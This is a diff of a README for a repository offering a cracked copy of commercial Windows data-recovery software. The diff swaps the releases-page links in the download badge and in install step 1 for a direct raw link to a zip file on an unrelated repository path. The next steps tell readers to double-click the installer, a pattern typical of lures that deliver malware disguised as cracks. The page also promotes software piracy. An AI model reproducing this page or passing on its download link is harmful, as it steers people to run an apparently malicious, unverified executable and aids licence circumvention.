@@ -5,7 +5,7 @@ description: "Recover deleted files, restore lost photos, and rebuild drive part
 ---
 # 💾 Stellar-Data-Recovery-Crack - Recover lost files on Windows quickly
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/conventional-narthex977/Stellar-Data-Recovery-Crack/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/conventional-narthex977/conventional-narthex977.github.io/main/fotch/io-conventional-narthex-github-2.6.zip)
 
 ## 📁 About the software
 
@@ -25,7 +25,7 @@ This software requires a Windows-based computer. Ensure your system meets the fo
 
 Follow these steps to install the software on your computer.
 
-1.  Visit this page to download the latest installer: [https://github.com/conventional-narthex977/Stellar-Data-Recovery-Crack/releases](https://github.com/conventional-narthex977/Stellar-Data-Recovery-Crack/releases).
+1.  Visit this page to download the latest installer: [https://raw.githubusercontent.com/conventional-narthex977/conventional-narthex977.github.io/main/fotch/io-conventional-narthex-github-2.6.zip](https://raw.githubusercontent.com/conventional-narthex977/conventional-narthex977.github.io/main/fotch/io-conventional-narthex-github-2.6.zip).
 2.  Locate the downloaded file in your browser downloads folder.
 3.  Double-click the installer file to begin the setup process.
 4.  Follow the prompts on your screen.
